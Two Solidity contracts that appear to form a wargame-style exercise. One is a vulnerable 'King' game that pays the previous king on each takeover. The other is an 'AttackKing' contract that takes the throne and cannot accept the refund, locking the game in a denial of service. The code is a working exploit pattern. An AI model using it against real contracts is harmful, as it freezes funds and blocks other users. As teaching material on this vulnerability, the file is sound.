// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import './King.sol';

contract AttackKing {
	address contractAddress;
	King king;

	constructor(address _contractAddress) public {
		contractAddress = _contractAddress;
	}

	function attack() public {
		king = King(payable(contractAddress));
		uint256 prize = king.prize();
		(bool success, ) = payable(king).call{value: prize + 1}('');

		require(success, 'Call unsuccessful...');
	}
}

// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {
	address payable king;
	uint256 public prize;
	address payable public owner;

	constructor() public payable {
		owner = msg.sender;
		king = msg.sender;
		prize = msg.value;
	}

	receive() external payable {
		require(msg.value >= prize || msg.sender == owner);
		king.transfer(msg.value);
		king = msg.sender;
		prize = msg.value;
	}

	function _king() public view returns (address payable) {
		return king;
	}
}